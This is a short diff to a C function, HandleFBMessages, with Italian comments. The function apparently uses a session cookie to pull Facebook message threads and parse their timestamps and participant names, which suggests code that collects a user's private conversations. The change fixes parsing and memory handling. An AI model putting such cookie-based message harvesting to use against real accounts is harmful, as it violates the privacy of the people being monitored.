@@ -307,7 +307,6 @@ DWORD HandleFBMessages(char *cookie)
 		memset(tstamp, 0, sizeof(tstamp));
 		memcpy(tstamp, parser1, 10);
 		act_tstamp = atoi(tstamp);
-		act_tstamp/=1000; // Qui il tstamp e' moltiplicato per 1000 rispetto ai valori degli altri campi!
 		if (act_tstamp>2000000000 || act_tstamp <= last_tstamp)
 			continue;
 
@@ -321,14 +320,18 @@ DWORD HandleFBMessages(char *cookie)
 		// Prende gli screenname di tutti i partecipanti
 		parser_inner1 = r_buffer_inner;
 		parser_inner1 = (BYTE *)strstr((char *)parser_inner1, FB_THREAD_AUTHOR_IDENTIFIER_V2);
-		if (!parser_inner1)
-			break;
-		parser1 += strlen(FB_THREAD_AUTHOR_IDENTIFIER_V2);
-		parser2 = (BYTE *)strstr((char *)parser1, " - ");
-		if (!parser2)
-			break;
-		*parser2 = 0;
-		_snprintf_s(peers, sizeof(peers), _TRUNCATE, "%s, %s", screen_name, parser1);
+		if (!parser_inner1) {
+			SAFE_FREE(r_buffer_inner);
+			continue;
+		}
+		parser_inner1 += strlen(FB_THREAD_AUTHOR_IDENTIFIER_V2);
+		parser_inner2 = (BYTE *)strstr((char *)parser_inner1, " - ");
+		if (!parser_inner2) {
+			SAFE_FREE(r_buffer_inner);
+			continue;
+		}
+		*parser_inner2 = 0;
+		_snprintf_s(peers, sizeof(peers), _TRUNCATE, "%s, %s", screen_name, parser_inner1);
 
 		parser_inner1 = r_buffer_inner;
 		// Clicla per tutti i messaggi del thread
